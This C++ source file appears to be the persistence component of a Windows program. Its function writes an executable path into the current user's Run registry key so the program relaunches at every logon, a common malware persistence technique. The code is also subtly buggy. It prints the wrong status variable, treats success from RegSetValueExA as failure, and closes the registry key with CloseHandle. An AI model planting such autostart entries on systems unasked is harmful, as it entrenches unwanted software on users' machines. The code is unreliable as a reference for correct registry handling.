#include "Presistence.h"

#include <iostream>
#include <windows.h>

int RegistryLogon(LPCSTR path, SIZE_T pathLength) {
    HKEY key;
    DWORD disposition;
    LSTATUS createStatus = RegCreateKeyExA(HKEY_CURRENT_USER, RUN_KEY, NULL, NULL, REG_OPTION_NON_VOLATILE,
                                           KEY_ALL_ACCESS, NULL, &key, &disposition);

    std::cout << "create status: " << createStatus;

    std::cout << " disposition: " << disposition << "\n";

    if (key == NULL) {
        std::cout << "RegCreateKeyExA Failed \n";
        return 1;
    }

    LSTATUS queryStatus = RegQueryValueExA(key, KEY_NAME, NULL, NULL, NULL, NULL);

    std::cout << "query status: " << createStatus;

    if (queryStatus == ERROR_FILE_NOT_FOUND) {

        const BYTE* pathBytes = reinterpret_cast<const BYTE*>(path);

        LSTATUS setStatus = RegSetValueExA(key, KEY_NAME, 0, REG_SZ, pathBytes, pathLength);

        std::cout << "set status: " << setStatus;

        if (!setStatus) {
            std::cout << "RegSetValue Failed status: " << setStatus << "\n";
            return 1;
        }
    }

    CloseHandle(key);

    return 0;
}
